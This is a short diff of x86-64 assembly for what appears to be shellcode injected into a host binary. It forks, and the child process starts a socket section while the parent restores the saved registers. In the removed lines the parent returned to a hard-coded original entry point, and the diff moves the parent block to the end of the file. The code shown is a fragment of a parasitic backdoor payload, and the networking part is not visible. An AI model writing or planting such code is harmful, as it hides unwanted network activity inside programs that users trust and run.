@@ -19,18 +19,7 @@ main:
   add rax,57
   syscall
   cmp eax, 0
-  jz child
-
-parent:
-  pop r11          ; restore all registers
-  pop rdi
-  pop rsi
-  pop rdx
-  pop rcx
-  pop rax
-
-  push 0x402f10    ; jump to original entry point
-  ret
+  jnz parent
 
 child:  
   ; socket
@@ -106,3 +95,13 @@ exit:
   mov     ebx,0    ; Exit code
   mov     eax,60   ; SYS_EXIT
   int     0x80
+
+
+
+parent:
+  pop r11          ; restore all registers
+  pop rdi
+  pop rsi
+  pop rdx
+  pop rcx
+  pop rax
